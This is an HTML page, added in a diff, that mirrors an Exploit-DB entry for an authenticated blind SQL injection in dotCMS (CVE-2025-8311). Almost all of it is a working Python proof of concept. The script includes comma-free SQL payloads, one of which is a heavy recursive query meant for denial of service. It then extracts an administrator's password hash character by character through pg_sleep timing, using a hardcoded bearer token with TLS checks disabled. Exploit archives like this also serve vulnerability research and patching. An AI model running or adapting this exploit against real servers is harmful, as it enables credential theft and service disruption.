@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OffSec’s Exploit Database Archive</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
+  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
+  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
+  .article-elevator-btn:hover { background: rgba(10,14,39,1); }
+</style>
+</head>
+<body>
+  <h1>OffSec’s Exploit Database Archive</h1>
+  <div class="metadata">
+    Source: Exploit-DB | Date: 9/16/2025 2:00:00 AM | Lang: EN |
+    <a href="https://www.exploit-db.com/exploits/52431" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div> <pre><code>#!/usr/bin/env python3 # Exploit Title: dotCMS 25.07.02-1 - Authenticated Blind SQL Injection
+# Google Dork: N/A
+# Date: 2025-09-09
+# Exploit Author: Matan Sandori (OSCP, OSEP, OSWE)
+# Vendor Homepage:*https://www.dotcms.com/
+# Software Link: https://github.com/dotCMS/core/releases/tag/v25.07.02-1 (tested on: v25.07.02-1)
+# Version: Affects 24.03.22 and later (see vendor advisory for fixed versions)
+# Tested on: dotCMS v25.07.02-1 (Docker / Linux)
+# CVE: CVE-2025-8311 # The application blocks the comma character, so a simple DoS payload like:
+# ') AND 1=(SELECT 1 FROM generate_series(1,500000) AS a CROSS JOIN generate_series(1,500000) AS b) AND ('FYHh' LIKE 'FYHh
+# will not work. # Instead, a comma-free payload can be used, for example:
+# ') AND 1=(WITH RECURSIVE nums(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM nums WHERE i &lt; 1000000) SELECT MIN(1) FROM nums AS a CROSS JOIN nums AS b) AND ('A' LIKE 'A # Example query for time-based extraction of data:
+# ') AND 1=(SELECT CASE WHEN (substring(emailaddress from 1 for 1)='a') THEN (SELECT 1 FROM pg_sleep(10) WHERE firstname='Admin') ELSE 1 END FROM user_ WHERE firstname='Admin') AND ('1' LIKE '1 # This PoC demonstrates time-based blind SQLi. Error-based SQLi is also possible and allows faster data extraction.
+# Using sqlmap with the --no-cast flag is recommended, as it will not work otherwise. import sys
+import time
+import string
+import urllib3
+import requests ### User configuration
+HOST="127.0.0.1:8443";
+TARGET_ACCOUNT = "admin@dotcms.com";
+SLEEP_TIME=10;
+TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhcGk0ZjFhNGYyMi1lYzI5LTQ4OTUtYTBlYi1jYjRkYjEzOGQ2MDAiLCJ4bW9kIjoxNzUxOTQzOTEwMDAwLCJuYmYiOjE3NTE5NDM5MTAsImlzcyI6ImRvdGNtc19kZXYiLCJsYWJlbCI6InRva2VuIiwiZXhwIjoxODQ2NjQxNjAxLCJpYXQiOjE3NTE5NDM5MTAsImp0aSI6IjMyNjIxYmRkLTNhYjEtNGRiMi1iNjEyLWMzMDg5M2EyODBiZSJ9.jqXkfM4Itxy_q2kA10srcL_3NBBx6keXx2PM0mESPFI";
+CHARS = string.printable; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); def encode_all_characters(string): return "".join("%{0:0&gt;2x}".format(ord(char)) for char in string); def send_request(payload=""): payload = encode_all_characters(payload); burp0_url = f"https://{HOST}/api/v1/contenttype?filter=LCKwsF&amp;page=774232&amp;per_page=517532&amp;orderby=wDdAmr&amp;direction=DESC&amp;type=DOTASSET&amp;host=BBadoI&amp;sites=PoC{payload}"; burp0_headers = {"Accept-Encoding": "gzip, deflate, br", "Accept": "*/*", "Accept-Language": "en-US;q=0.9,en;q=0.8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Connection": "close", "Cache-Control": "max-age=0", "Authorization": f"Bearer {TOKEN}"}; return requests.get(burp0_url, headers=burp0_headers, verify=False); def send_sqli(q): query = "') AND 1=(" + q + ") AND ('A' LIKE 'A"; return send_request(query); def test_sqli(): print("[!] Checking target responsiveness...") r = send_request(); if '{"entity":[],"errors":[],"i18nMessagesMap":{},"messages":[],"pagination":{"currentPage":' not in r.text: print("[-] Target did NOT return the expected JSON structure. Exiting."); sys.exit(1); print("[+] Target responded correctly.\n"); r = send_sqli(f"SELECT 1 FROM PG_SLEEP({SLEEP_TIME})"); if (not r.elapsed.total_seconds() &gt;= SLEEP_TIME): print("[-] Target did not pause as expected; Exiting."); sys.exit(1); def retrieve_password(TEMPLATE, CHARS): CHARS = ":" + CHARS.replace(":", ''); output = ""; index = 1; while True: for character in CHARS: query = str(TEMPLATE).replace("[_INDEX_PLACEHOLDER_]", str(index)).replace("[_ASCII_PLACEHOLDER_]", str(ord(character))); r = send_sqli(query); if (r.elapsed.total_seconds() &gt;= SLEEP_TIME): print(f"[+] Found character: {character}"); index += 1; output += character; break; else: break; return output; test_sqli(); print("[+] Target is Vulnerable to SQL Injection.\n"); TEMPLATE = f"SELECT (CASE WHEN (substring(password_ from [_INDEX_PLACEHOLDER_] for 1)=chr([_ASCII_PLACEHOLDER_])) THEN (SELECT 1 FROM pg_sleep({SLEEP_TIME / 2}) WHERE emailaddress = '{TARGET_ACCOUNT}') ELSE 1 END) from user_ where emailaddress = '{TARGET_ACCOUNT}'"; password = retrieve_password(TEMPLATE, CHARS); print(f"[+] Retrieved hash/password for {TARGET_ACCOUNT}: {password}"); </code></pre> </div></div>
+  </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'top') scrollToTop();
+      if (data.direction === 'bottom') scrollToBottom();
+    });
+  </script>
+</body>
+</html>
